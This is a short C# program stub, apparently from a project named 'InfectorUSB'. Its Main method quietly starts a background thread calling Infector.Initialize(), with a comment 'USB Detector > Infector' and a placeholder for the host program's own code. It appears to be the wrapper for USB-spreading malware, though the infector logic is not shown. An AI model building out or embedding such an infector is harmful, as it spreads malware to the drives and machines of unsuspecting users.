using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;

namespace InfectorUSB
{
    class Program
    {
        static void Main(string[] args)
        {
            // USB Detector > Infector
            new Thread(() => { Infector.Initialize(); } ).Start();

            // Your code...
        }
    }
}
